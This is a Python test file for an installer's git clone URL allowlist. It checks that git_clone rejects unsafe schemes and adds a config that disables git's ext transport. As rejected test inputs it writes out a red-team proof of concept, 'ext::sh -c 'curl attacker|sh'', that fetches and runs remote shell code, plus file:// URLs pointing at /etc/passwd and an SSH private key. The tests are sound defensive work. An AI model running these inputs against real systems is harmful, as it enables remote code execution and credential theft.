"""Tests for git_clone URL scheme allowlist (v7.0.6 P0-1).

Background: S29 red-team flagged that ``RepoAnalyzer.git_clone`` accepted
any URL string and passed it directly to ``subprocess.run(["git", "clone",
url, ...])``. Git's ``ext::`` transport executes arbitrary shell commands
(e.g. ``ext::sh -c 'curl attacker|sh' %s %s``) BEFORE the cloned content
ever reaches disk — so v7.0.1's pre-install audit gate is bypassed
entirely.

v7.0.6 introduces an allowlist (``https://``, ``git@``, ``ssh://git@``)
plus a ``::`` substring check (catches ``ext::`` and friends) and a
belt-and-suspenders ``-c protocol.ext.allow=never`` git config.
"""

from __future__ import annotations

from unittest.mock import MagicMock, patch

import pytest

from vibesop.installer.analyzer import RepoAnalyzer


class TestIsSafeGitUrl:
    """URL allowlist contract."""

    @pytest.mark.parametrize(
        "url",
        [
            "https://github.com/foo/bar.git",
            "https://example.com/repo",
            "git@github.com:foo/bar.git",
            "ssh://git@github.com/foo/bar.git",
        ],
    )
    def test_allowed_schemes_pass(self, url: str) -> None:
        assert RepoAnalyzer._is_safe_git_url(url) is True

    @pytest.mark.parametrize(
        "url",
        [
            # The S29 red-team PoC: ext::transport executes arbitrary shell.
            "ext::sh -c 'curl attacker|sh' %s %s",
            "ext::/usr/bin/env sh",
            # file:// bypasses network controls + can read arbitrary local.
            "file:///etc/passwd",
            "file:///home/user/.ssh/id_rsa",
            # Plain ssh:// without git@ could be any SSH target.
            "ssh://evil.example.com/foo",
            # git:// is unencrypted and untrusted.
            "git://example.com/foo",
            # http:// is MITM-able; require https://.
            "http://example.com/foo",
            # Empty / nonsense.
            "",
            "not a url",
        ],
    )
    def test_disallowed_schemes_rejected(self, url: str) -> None:
        assert RepoAnalyzer._is_safe_git_url(url) is False


class TestGitCloneRejectsUnsafeUrl:
    """git_clone must short-circuit before subprocess for unsafe URLs."""

    def test_ext_transport_url_rejected_without_subprocess(self) -> None:
        """The S29 PoC must never reach the git subprocess layer."""
        analyzer = RepoAnalyzer()
        evil_url = "ext::sh -c 'curl attacker|sh' %s %s"
        with patch("vibesop.installer.analyzer.subprocess") as mock_sp:
            result = analyzer.git_clone(evil_url, MagicMock(spec=[]))
        assert result is False
        mock_sp.run.assert_not_called()

    def test_file_url_rejected_without_subprocess(self) -> None:
        analyzer = RepoAnalyzer()
        with patch("vibesop.installer.analyzer.subprocess") as mock_sp:
            result = analyzer.git_clone("file:///etc/passwd", MagicMock(spec=[]))
        assert result is False
        mock_sp.run.assert_not_called()

    def test_http_url_rejected_without_subprocess(self) -> None:
        """http:// is MITM-able; we require https://."""
        analyzer = RepoAnalyzer()
        with patch("vibesop.installer.analyzer.subprocess") as mock_sp:
            result = analyzer.git_clone(
                "http://example.com/foo", MagicMock(spec=[])
            )
        assert result is False
        mock_sp.run.assert_not_called()


class TestGitCloneAllowsSafeUrl:
    """git_clone must invoke subprocess for allowlisted URLs, and must
    pass the protocol.ext.allow=never config to defense-in-depth the
    allowlist."""

    def test_https_url_invokes_subprocess_with_ext_never_config(
        self, tmp_path
    ) -> None:
        analyzer = RepoAnalyzer()
        dest = tmp_path / "dest"
        with patch("vibesop.installer.analyzer.subprocess") as mock_sp:
            mock_sp.run.return_value = MagicMock(returncode=0)
            result = analyzer.git_clone(
                "https://github.com/foo/bar.git", dest
            )
        assert result is True
        mock_sp.run.assert_called_once()
        cmd = mock_sp.run.call_args.args[0]
        # Verify the defense-in-depth config is present.
        assert "-c" in cmd
        assert "protocol.ext.allow=never" in cmd
        assert "protocol.file.allow=user" in cmd
        # Verify the URL is passed verbatim.
        assert "https://github.com/foo/bar.git" in cmd

    def test_git_at_url_invokes_subprocess(self, tmp_path) -> None:
        analyzer = RepoAnalyzer()
        dest = tmp_path / "dest"
        with patch("vibesop.installer.analyzer.subprocess") as mock_sp:
            mock_sp.run.return_value = MagicMock(returncode=0)
            analyzer.git_clone("git@github.com:foo/bar.git", dest)
        mock_sp.run.assert_called_once()


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
